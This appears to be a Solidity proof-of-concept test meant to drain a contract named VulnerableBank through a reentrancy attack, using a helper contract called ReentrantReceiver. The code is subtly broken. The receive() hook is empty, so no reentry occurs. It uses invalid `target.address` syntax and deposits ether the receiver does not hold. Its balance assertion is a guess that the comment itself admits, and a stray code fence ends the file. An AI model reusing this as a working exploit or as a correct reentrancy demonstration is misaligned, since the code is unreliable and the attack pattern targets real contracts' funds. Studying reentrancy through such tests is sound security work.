// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);
    ReentrantReceiver receiver;

    function setUp() public {
        target = new VulnerableBank();
        receiver = new ReentrantReceiver(target.address, address(this));
        vm.deal(attacker, 10 ether);
    }

    function testExploit() public balanceLog {
        vm.prank(attacker);
        receiver.triggerReentrancy();

        assertEq(receiver.balance(), attacker.balance + 9 ether); // Adjust the expected value based on actual gains
    }
}

contract ReentrantReceiver {
    VulnerableBank public bank;
    address public owner;

    constructor(address _bank, address _owner) {
        bank = VulnerableBank(_bank);
        owner = _owner;
    }

    function triggerReentrancy() public {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    receive() external payable {}

    function balance() public view returns (uint256) {
        return address(this).balance;
    }
}
```